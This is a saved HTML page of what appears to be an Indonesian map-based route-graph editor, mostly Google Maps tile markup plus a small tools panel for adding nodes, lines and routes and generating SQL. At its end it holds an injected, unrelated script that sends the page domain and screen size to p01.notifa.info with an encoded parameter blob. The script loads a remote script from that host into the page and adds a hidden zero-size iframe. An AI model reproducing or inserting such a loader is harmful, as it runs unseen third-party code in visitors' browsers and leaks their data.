src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i13!2i6527!3i4237!4i256!2m3!1e0!2sm!3i470180248!2m3!1e2!6m1!3e5!3m14!2sen-US!3sUS!5e18!12m1!1e68!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcC5zOi02MHxwLmw6LTYw!4e0&amp;token=85469" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: -256px; top: -512px; width: 256px; height: 256px; transition: opacity 200ms linear;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i13!2i6526!3i4237!4i256!2m3!1e0!2sm!3i470180248!2m3!1e2!6m1!3e5!3m14!2sen-US!3sUS!5e18!12m1!1e68!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcC5zOi02MHxwLmw6LTYw!4e0&amp;token=26042" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: 512px; top: -512px; width: 256px; height: 256px; transition: opacity 200ms linear;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i13!2i6529!3i4237!4i256!2m3!1e0!2sm!3i470180248!2m3!1e2!6m1!3e5!3m14!2sen-US!3sUS!5e18!12m1!1e68!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcC5zOi02MHxwLmw6LTYw!4e0&amp;token=73252" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: 256px; top: -512px; width: 256px; height: 256px; transition: opacity 200ms linear;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i13!2i6528!3i4237!4i256!2m3!1e0!2sm!3i470180248!2m3!1e2!6m1!3e5!3m14!2sen-US!3sUS!5e18!12m1!1e68!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcC5zOi02MHxwLmw6LTYw!4e0&amp;token=13825" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: 256px; top: 512px; width: 256px; height: 256px; transition: opacity 200ms linear;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i13!2i6528!3i4241!4i256!2m3!1e0!2sm!3i470180236!2m3!1e2!6m1!3e5!3m14!2sen-US!3sUS!5e18!12m1!1e68!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcC5zOi02MHxwLmw6LTYw!4e0&amp;token=53077" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: 0px; top: 512px; width: 256px; height: 256px; transition: opacity 200ms linear;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i13!2i6527!3i4241!4i256!2m3!1e0!2sm!3i470180248!2m3!1e2!6m1!3e5!3m14!2sen-US!3sUS!5e18!12m1!1e68!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcC5zOi02MHxwLmw6LTYw!4e0&amp;token=59206" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: -256px; top: 512px; width: 256px; height: 256px; transition: opacity 200ms linear;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i13!2i6526!3i4241!4i256!2m3!1e0!2sm!3i470180248!2m3!1e2!6m1!3e5!3m14!2sen-US!3sUS!5e18!12m1!1e68!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcC5zOi02MHxwLmw6LTYw!4e0&amp;token=130850" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: 512px; top: 512px; width: 256px; height: 256px; transition: opacity 200ms linear;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i13!2i6529!3i4241!4i256!2m3!1e0!2sm!3i470180236!2m3!1e2!6m1!3e5!3m14!2sen-US!3sUS!5e18!12m1!1e68!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcC5zOi02MHxwLmw6LTYw!4e0&amp;token=112504" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: 768px; top: 0px; width: 256px; height: 256px; transition: opacity 200ms linear;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i13!2i6530!3i4239!4i256!2m3!1e0!2sm!3i470180248!2m3!1e2!6m1!3e5!3m14!2sen-US!3sUS!5e18!12m1!1e68!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcC5zOi02MHxwLmw6LTYw!4e0&amp;token=79439" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: 768px; top: 512px; width: 256px; height: 256px; transition: opacity 200ms linear;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i13!2i6530!3i4241!4i256!2m3!1e0!2sm!3i470180236!2m3!1e2!6m1!3e5!3m14!2sen-US!3sUS!5e18!12m1!1e68!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcC5zOi02MHxwLmw6LTYw!4e0&amp;token=91564" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: 768px; top: 256px; width: 256px; height: 256px; transition: opacity 200ms linear;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i13!2i6530!3i4240!4i256!2m3!1e0!2sm!3i470180248!2m3!1e2!6m1!3e5!3m14!2sen-US!3sUS!5e18!12m1!1e68!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcC5zOi02MHxwLmw6LTYw!4e0&amp;token=78021" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: 768px; top: -256px; width: 256px; height: 256px; transition: opacity 200ms linear;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i13!2i6530!3i4238!4i256!2m3!1e0!2sm!3i470180248!2m3!1e2!6m1!3e5!3m14!2sen-US!3sUS!5e18!12m1!1e68!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcC5zOi02MHxwLmw6LTYw!4e0&amp;token=340" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: -512px; top: 0px; width: 256px; height: 256px; transition: opacity 200ms linear;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i13!2i6525!3i4239!4i256!2m3!1e0!2sm!3i470180248!2m3!1e2!6m1!3e5!3m14!2sen-US!3sUS!5e18!12m1!1e68!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcC5zOi02MHxwLmw6LTYw!4e0&amp;token=124813" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: -512px; top: 256px; width: 256px; height: 256px; transition: opacity 200ms linear;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i13!2i6525!3i4240!4i256!2m3!1e0!2sm!3i470180248!2m3!1e2!6m1!3e5!3m14!2sen-US!3sUS!5e18!12m1!1e68!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcC5zOi02MHxwLmw6LTYw!4e0&amp;token=123395" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div><div style="position: absolute; left: -512px; top: -256px; width: 256px; height: 256px; transition: opacity 200ms linear;"><img draggable="false" alt="" role="presentation" src="https://maps.googleapis.com/maps/vt?pb=!1m5!1m4!1i13!2i6525!3i4238!4i256!2m3!1e0!2sm!3i470180248!2m3!1e2!6m1!3e5!3m14!2sen-US!3sUS!5e18!12m1!1e68!12m3!1e37!2m1!1ssmartmaps!12m4!1e26!2m2!1sstyles!2zcC5zOi02MHxwLmw6LTYw!4e0&amp;token=45714" style="width: 256px; height: 256px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none;"></div></div></div></div><div class="gm-style-pbc" style="z-index: 2; position: absolute; height: 100%; width: 100%; padding: 0px; border-width: 0px; margin: 0px; left: 0px; top: 0px; opacity: 0; transition-duration: 0.2s;"><p class="gm-style-pbt"></p></div><div style="z-index: 3; position: absolute; height: 100%; width: 100%; padding: 0px; border-width: 0px; margin: 0px; left: 0px; top: 0px; touch-action: pan-x pan-y;"><div style="z-index: 4; position: absolute; left: 50%; top: 50%; width: 100%; transform: translate(-96px, 27px); will-change: transform;"><div style="position: absolute; left: 0px; top: 0px; z-index: 104; width: 100%;"></div><div style="position: absolute; left: 0px; top: 0px; z-index: 105; width: 100%;"></div><div style="position: absolute; left: 0px; top: 0px; z-index: 106; width: 100%;"><div style="position: absolute; left: 0px; top: 0px; z-index: 0;"></div><div style="position: absolute; left: 0px; top: 0px; z-index: -1;"></div></div><div style="position: absolute; left: 0px; top: 0px; z-index: 107; width: 100%;"><div style="z-index: -202; cursor: pointer; display: none; touch-action: none;"><div style="width: 30px; height: 27px; overflow: hidden; position: absolute;"><img alt="" src="https://maps.gstatic.com/mapfiles/undo_poly.png" draggable="false" style="position: absolute; left: 0px; top: 0px; user-select: none; border: 0px; padding: 0px; margin: 0px; max-width: none; width: 90px; height: 27px;"></div></div></div></div></div></div><iframe aria-hidden="true" frameborder="0" src="about:blank" style="z-index: -1; position: absolute; width: 100%; height: 100%; top: 0px; left: 0px; border: none;" __idm_frm__="39"></iframe><div style="margin-left: 5px; margin-right: 5px; z-index: 1000000; position: absolute; left: 0px; bottom: 0px;"><a target="_blank" rel="noopener" href="https://maps.google.com/maps?ll=-6.313508,106.869707&amp;z=13&amp;t=m&amp;hl=en-US&amp;gl=US&amp;mapclient=apiv3" title="Open this area in Google Maps (opens a new window)" style="position: static; overflow: visible; float: none; display: inline;"><div style="width: 66px; height: 26px; cursor: pointer;"><img alt="" src="https://maps.gstatic.com/mapfiles/api-3/images/google4.png" draggable="false" style="position: absolute; left: 0px; top: 0px; width: 66px; height: 26px; user-select: none; border: 0px; padding: 0px; margin: 0px;"></div></a></div><div style="background-color: white; padding: 15px 21px; border: 1px solid rgb(171, 171, 171); font-family: Roboto, Arial, sans-serif; color: rgb(34, 34, 34); box-sizing: border-box; box-shadow: rgba(0, 0, 0, 0.2) 0px 4px 16px; z-index: 10000002; display: none; width: 300px; height: 180px; position: absolute; left: 54px; top: 165px;"><div style="padding: 0px 0px 10px; font-size: 16px; box-sizing: border-box;">Map Data</div><div style="font-size: 13px;">Map data ©2019</div><button draggable="false" title="Close" aria-label="Close" type="button" class="gm-ui-hover-effect" style="background: none; display: block; border: 0px; margin: 0px; padding: 0px; position: absolute; cursor: pointer; user-select: none; top: 0px; right: 0px; width: 37px; height: 37px;"><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2224px%22%20height%3D%2224px%22%20viewBox%3D%220%200%2024%2024%22%20fill%3D%22%23000000%22%3E%0A%20%20%20%20%3Cpath%20d%3D%22M19%206.41L17.59%205%2012%2010.59%206.41%205%205%206.41%2010.59%2012%205%2017.59%206.41%2019%2012%2013.41%2017.59%2019%2019%2017.59%2013.41%2012z%22%2F%3E%0A%20%20%20%20%3Cpath%20d%3D%22M0%200h24v24H0z%22%20fill%3D%22none%22%2F%3E%0A%3C%2Fsvg%3E%0A" style="pointer-events: none; display: block; width: 13px; height: 13px; margin: 12px;"></button></div><div class="gmnoprint" style="z-index: 1000001; position: absolute; right: 162px; bottom: 0px; width: 87px;"><div draggable="false" class="gm-style-cc" style="user-select: none; height: 14px; line-height: 14px;"><div style="opacity: 0.7; width: 100%; height: 100%; position: absolute;"><div style="width: 1px;"></div><div style="background-color: rgb(245, 245, 245); width: auto; height: 100%; margin-left: 1px;"></div></div><div style="position: relative; padding-right: 6px; padding-left: 6px; box-sizing: border-box; font-family: Roboto, Arial, sans-serif; font-size: 10px; color: rgb(68, 68, 68); white-space: nowrap; direction: ltr; text-align: right; vertical-align: middle; display: inline-block;"><a style="text-decoration: none; cursor: pointer; display: none;">Map Data</a><span>Map data ©2019</span></div></div></div><div class="gmnoscreen" style="position: absolute; right: 0px; bottom: 0px;"><div style="font-family: Roboto, Arial, sans-serif; font-size: 11px; color: rgb(68, 68, 68); direction: ltr; text-align: right; background-color: rgb(245, 245, 245);">Map data ©2019</div></div><div class="gmnoprint gm-style-cc" draggable="false" style="z-index: 1000001; user-select: none; height: 14px; line-height: 14px; position: absolute; right: 93px; bottom: 0px;"><div style="opacity: 0.7; width: 100%; height: 100%; position: absolute;"><div style="width: 1px;"></div><div style="background-color: rgb(245, 245, 245); width: auto; height: 100%; margin-left: 1px;"></div></div><div style="position: relative; padding-right: 6px; padding-left: 6px; box-sizing: border-box; font-family: Roboto, Arial, sans-serif; font-size: 10px; color: rgb(68, 68, 68); white-space: nowrap; direction: ltr; text-align: right; vertical-align: middle; display: inline-block;"><a href="https://www.google.com/intl/en-US_US/help/terms_maps.html" target="_blank" rel="noopener" style="text-decoration: none; cursor: pointer; color: rgb(68, 68, 68);">Terms of Use</a></div></div><button draggable="false" title="Toggle fullscreen view" aria-label="Toggle fullscreen view" type="button" class="gm-control-active gm-fullscreen-control" style="background: none rgb(255, 255, 255); border: 0px; margin: 10px; padding: 0px; position: absolute; cursor: pointer; user-select: none; border-radius: 2px; height: 40px; width: 40px; box-shadow: rgba(0, 0, 0, 0.3) 0px 1px 4px -1px; overflow: hidden; top: 0px; right: 0px;"><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2218%22%20height%3D%2218%22%20viewBox%3D%220%20018%2018%22%3E%0A%20%20%3Cpath%20fill%3D%22%23666%22%20d%3D%22M0%2C0v2v4h2V2h4V0H2H0z%20M16%2C0h-4v2h4v4h2V2V0H16z%20M16%2C16h-4v2h4h2v-2v-4h-2V16z%20M2%2C12H0v4v2h2h4v-2H2V12z%22%2F%3E%0A%3C%2Fsvg%3E%0A" style="height: 18px; width: 18px;"><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2218%22%20height%3D%2218%22%20viewBox%3D%220%200%2018%2018%22%3E%0A%20%20%3Cpath%20fill%3D%22%23333%22%20d%3D%22M0%2C0v2v4h2V2h4V0H2H0z%20M16%2C0h-4v2h4v4h2V2V0H16z%20M16%2C16h-4v2h4h2v-2v-4h-2V16z%20M2%2C12H0v4v2h2h4v-2H2V12z%22%2F%3E%0A%3C%2Fsvg%3E%0A" style="height: 18px; width: 18px;"><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2218%22%20height%3D%2218%22%20viewBox%3D%220%200%2018%2018%22%3E%0A%20%20%3Cpath%20fill%3D%22%23111%22%20d%3D%22M0%2C0v2v4h2V2h4V0H2H0z%20M16%2C0h-4v2h4v4h2V2V0H16z%20M16%2C16h-4v2h4h2v-2v-4h-2V16z%20M2%2C12H0v4v2h2h4v-2H2V12z%22%2F%3E%0A%3C%2Fsvg%3E%0A" style="height: 18px; width: 18px;"></button><div draggable="false" class="gm-style-cc" style="user-select: none; height: 14px; line-height: 14px; position: absolute; right: 0px; bottom: 0px;"><div style="opacity: 0.7; width: 100%; height: 100%; position: absolute;"><div style="width: 1px;"></div><div style="background-color: rgb(245, 245, 245); width: auto; height: 100%; margin-left: 1px;"></div></div><div style="position: relative; padding-right: 6px; padding-left: 6px; box-sizing: border-box; font-family: Roboto, Arial, sans-serif; font-size: 10px; color: rgb(68, 68, 68); white-space: nowrap; direction: ltr; text-align: right; vertical-align: middle; display: inline-block;"><a target="_blank" rel="noopener" title="Report errors in the road map or imagery to Google" href="https://www.google.com/maps/@-6.3135079,106.8697066,13z/data=!10m1!1e1!12b1?source=apiv3&amp;rapsrc=apiv3" style="font-family: Roboto, Arial, sans-serif; font-size: 10px; color: rgb(68, 68, 68); text-decoration: none; position: relative;">Report a map error</a></div></div><div class="gmnoprint gm-bundled-control gm-bundled-control-on-bottom" draggable="false" controlwidth="40" controlheight="113" style="margin: 10px; user-select: none; position: absolute; bottom: 127px; right: 40px;"><div class="gmnoprint" controlwidth="40" controlheight="81" style="position: absolute; left: 0px; top: 32px;"><div draggable="false" style="user-select: none; box-shadow: rgba(0, 0, 0, 0.3) 0px 1px 4px -1px; border-radius: 2px; cursor: pointer; background-color: rgb(255, 255, 255); width: 40px; height: 81px;"><button draggable="false" title="Zoom in" aria-label="Zoom in" type="button" class="gm-control-active" style="background: none; display: block; border: 0px; margin: 0px; padding: 0px; position: relative; cursor: pointer; user-select: none; overflow: hidden; width: 40px; height: 40px; top: 0px; left: 0px;"><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2218%22%20height%3D%2218%22%20viewBox%3D%220%200%2018%2018%22%3E%0A%20%20%3Cpolygon%20fill%3D%22%23666%22%20points%3D%2218%2C7%2011%2C7%2011%2C0%207%2C0%207%2C7%200%2C7%200%2C11%207%2C11%207%2C18%2011%2C18%2011%2C11%2018%2C11%22%2F%3E%0A%3C%2Fsvg%3E%0A" style="height: 18px; width: 18px;"><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2218%22%20height%3D%2218%22%20viewBox%3D%220%200%2018%2018%22%3E%0A%20%20%3Cpolygon%20fill%3D%22%23333%22%20points%3D%2218%2C7%2011%2C7%2011%2C0%207%2C0%207%2C7%200%2C7%200%2C11%207%2C11%207%2C18%2011%2C18%2011%2C11%2018%2C11%22%2F%3E%0A%3C%2Fsvg%3E%0A" style="height: 18px; width: 18px;"><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2218%22%20height%3D%2218%22%20viewBox%3D%220%200%2018%2018%22%3E%0A%20%20%3Cpolygon%20fill%3D%22%23111%22%20points%3D%2218%2C7%2011%2C7%2011%2C0%207%2C0%207%2C7%200%2C7%200%2C11%207%2C11%207%2C18%2011%2C18%2011%2C11%2018%2C11%22%2F%3E%0A%3C%2Fsvg%3E%0A" style="height: 18px; width: 18px;"></button><div style="position: relative; overflow: hidden; width: 30px; height: 1px; margin: 0px 5px; background-color: rgb(230, 230, 230); top: 0px;"></div><button draggable="false" title="Zoom out" aria-label="Zoom out" type="button" class="gm-control-active" style="background: none; display: block; border: 0px; margin: 0px; padding: 0px; position: relative; cursor: pointer; user-select: none; overflow: hidden; width: 40px; height: 40px; top: 0px; left: 0px;"><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2218%22%20height%3D%2218%22%20viewBox%3D%220%200%2018%2018%22%3E%0A%20%20%3Cpath%20fill%3D%22%23666%22%20d%3D%22M0%2C7h18v4H0V7z%22%2F%3E%0A%3C%2Fsvg%3E%0A" style="height: 18px; width: 18px;"><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2218%22%20height%3D%2218%22%20viewBox%3D%220%200%2018%2018%22%3E%0A%20%20%3Cpath%20fill%3D%22%23333%22%20d%3D%22M0%2C7h18v4H0V7z%22%2F%3E%0A%3C%2Fsvg%3E%0A" style="height: 18px; width: 18px;"><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2218%22%20height%3D%2218%22%20viewBox%3D%220%200%2018%2018%22%3E%0A%20%20%3Cpath%20fill%3D%22%23111%22%20d%3D%22M0%2C7h18v4H0V7z%22%2F%3E%0A%3C%2Fsvg%3E%0A" style="height: 18px; width: 18px;"></button></div></div><div style="position: absolute; left: 20px; top: 0px;"></div><div class="gmnoprint" controlwidth="40" controlheight="40" style="display: none; position: absolute;"><div style="width: 40px; height: 40px;"><button draggable="false" title="Rotate map 90 degrees" aria-label="Rotate map 90 degrees" type="button" class="gm-control-active" style="background: none rgb(255, 255, 255); display: none; border: 0px; margin: 0px 0px 32px; padding: 0px; position: relative; cursor: pointer; user-select: none; width: 40px; height: 40px; top: 0px; left: 0px; overflow: hidden; box-shadow: rgba(0, 0, 0, 0.3) 0px 1px 4px -1px; border-radius: 2px;"><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2224%22%20height%3D%2222%22%20viewBox%3D%220%200%2024%2022%22%3E%0A%20%20%3Cpath%20fill%3D%22%23666%22%20fill-rule%3D%22evenodd%22%20d%3D%22M20%2010c0-5.52-4.48-10-10-10s-10%204.48-10%2010v5h5v-5c0-2.76%202.24-5%205-5s5%202.24%205%205v5h-4l6.5%207%206.5-7h-4v-5z%22%20clip-rule%3D%22evenodd%22%2F%3E%0A%3C%2Fsvg%3E%0A" style="height: 18px; width: 18px;"><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2224%22%20height%3D%2222%22%20viewBox%3D%220%200%2024%2022%22%3E%0A%20%20%3Cpath%20fill%3D%22%23333%22%20fill-rule%3D%22evenodd%22%20d%3D%22M20%2010c0-5.52-4.48-10-10-10s-10%204.48-10%2010v5h5v-5c0-2.76%202.24-5%205-5s5%202.24%205%205v5h-4l6.5%207%206.5-7h-4v-5z%22%20clip-rule%3D%22evenodd%22%2F%3E%0A%3C%2Fsvg%3E%0A" style="height: 18px; width: 18px;"><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2224%22%20height%3D%2222%22%20viewBox%3D%220%200%2024%2022%22%3E%0A%20%20%3Cpath%20fill%3D%22%23111%22%20fill-rule%3D%22evenodd%22%20d%3D%22M20%2010c0-5.52-4.48-10-10-10s-10%204.48-10%2010v5h5v-5c0-2.76%202.24-5%205-5s5%202.24%205%205v5h-4l6.5%207%206.5-7h-4v-5z%22%20clip-rule%3D%22evenodd%22%2F%3E%0A%3C%2Fsvg%3E%0A" style="height: 18px; width: 18px;"></button><button draggable="false" title="Tilt map" aria-label="Tilt map" type="button" class="gm-tilt gm-control-active" style="background: none rgb(255, 255, 255); display: block; border: 0px; margin: 0px; padding: 0px; position: relative; cursor: pointer; user-select: none; width: 40px; height: 40px; top: 0px; left: 0px; overflow: hidden; box-shadow: rgba(0, 0, 0, 0.3) 0px 1px 4px -1px; border-radius: 2px;"><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2218px%22%20height%3D%2216px%22%20viewBox%3D%220%200%2018%2016%22%3E%0A%20%20%3Cpath%20fill%3D%22%23666%22%20d%3D%22M0%2C16h8V9H0V16z%20M10%2C16h8V9h-8V16z%20M0%2C7h8V0H0V7z%20M10%2C0v7h8V0H10z%22%2F%3E%0A%3C%2Fsvg%3E%0A" style="width: 18px;"><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2218px%22%20height%3D%2216px%22%20viewBox%3D%220%200%2018%2016%22%3E%0A%20%20%3Cpath%20fill%3D%22%23333%22%20d%3D%22M0%2C16h8V9H0V16z%20M10%2C16h8V9h-8V16z%20M0%2C7h8V0H0V7z%20M10%2C0v7h8V0H10z%22%2F%3E%0A%3C%2Fsvg%3E%0A" style="width: 18px;"><img src="data:image/svg+xml,%3Csvg%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%20width%3D%2218px%22%20height%3D%2216px%22%20viewBox%3D%220%200%2018%2016%22%3E%0A%20%20%3Cpath%20fill%3D%22%23111%22%20d%3D%22M0%2C16h8V9H0V16z%20M10%2C16h8V9h-8V16z%20M0%2C7h8V0H0V7z%20M10%2C0v7h8V0H10z%22%2F%3E%0A%3C%2Fsvg%3E%0A" style="width: 18px;"></button></div></div></div></div></div></div>
	<div style="float:right; margin-left:20px; width:110px; background:;">
		<h3>Tools</h3>
		<hr>
		<br>
		<a id="add_nodex" onclick="add_node()">Add Node</a>
		<br>
		<a id="add_linex" onclick="add_line()">Add Line</a>
		<br>
		<a id="add_destinationx" onclick="add_destination()">Add Destination</a>
		<br>				
		<a id="add_route" onclick="add_route()">Add Route</a>
		<br>
		<div id="insert_route" style="background: #eeeeee; margin:4px; width:510px; display: none">
			<span style="position: relative; top:0; left:97%; cursor: pointer" onclick="add_route()">x</span>
			<br>
			<textarea id="text_route" placeholder="#format
kendaraan=jalur_yg_dilewati
#contoh
T01=,0-1,1-2,2-5,5-6,6-5,5-2,2-1,1-0,
T04=,0-1,1-4,4-9,9-4,4-1,1-0," style="width:490px;height:100px;"></textarea>
		</div>
		<!-- FLOW ROUTE - UNDER DEVELOPMENT 
		<a id="add_route" onclick="add_route()">Flow Route</a>
		<br>
		-->
		<!-- LOAD JSON - UNDER DEVELOPMENT 
		<a id="load_markerlinex" onclick="load_markerlinex()" style='color: blue;'>Load Json</a>		
		<br>
		<div id="load_json" style="background: #eeeeee; margin:4px; width:230px; display: none">
			<span style="position: relative; top:0; left:94%; cursor: pointer" onclick="load_markerlinex()">x</span>
			<br>
			<textarea id="text_json" style="width:200px;height:100px;"></textarea>
			<button onclick="load_json()">Load</button>
		</div>
		-->
		<a id="save_markerlinex" onclick="save_markerlinex()" style="color: blue;">Generate SQL</a>	
	</div>
	<br>&nbsp;
	<br>
	<textarea id="txt" style="width:700px; height:200px; display:none;" placeholder="output JSON"></textarea>

	<script>
		$(document).ready(function(){
			$('.showx').css({'position': 'absolute', 'top': 0, 'right': 0});
		});
	</script>
	<style>.hidden{display:none;}</style>
	<img class="showx hidden" src="img/graphnya.png" style="position: absolute; top: 0px; right: 0px;">
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2P3rwmBwAPmusnkdF4lCd8qkJTngEnANDXr0zc3PgEU5RF%2ftkB0oU5VA55kDnz42eF9wmGXvVZL1qT0h4eH8KCi1lyVl3fL%2bQ4RSzaP8LVfEpF%2bzsTIMxvJ7hp0cl8X4zUKwuUpZ4eu%2bGyg32rF5zy%2fjp5lN4iYpwgagzes5OcinF5L7nYnNcwzCG8lqbp117gwkcE%2f6UF%2bgZPB5y1NGXa1a7bCa1fZ7j9XYOoEOpRkkOhwOLr6bzO0pJ6vT20YU6EKCFTHxw0IiTRx2DFTVAIoQ3LUPJb9s1V4NgCKDyXNN2wGLDkZ%2fFjUypqsdfFPj0XyXNPoZgG%2bjlJIBqi7mpKvUq%2fBFssw96ohWEY32JBupjnbM5tvhytUVNXpStTpxMglCW%2fAyTl8ZFYV%2fqy5jJlufcSaB30LgGeKvOKOOldI3Nv1k3RdZoJnzEEN1aFunlOIZT8EmMlXCifsFJCcqq08H0gIOrnk%2fEDJjJx%2foagIA8Wyc6eOjdmODJcYC7PRxywG1xkpQ3tf%2fDb9gtXJYGrDWJdjWHmbirb3q3FQrTmTQ%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
<iframe id="ifrm" scrolling="no" src="http://p01.notifa.info/campaign/log.php" style="height: 0px; width: 0px; overflow: hidden; border: 0px; padding: 0px;"></iframe></body></html>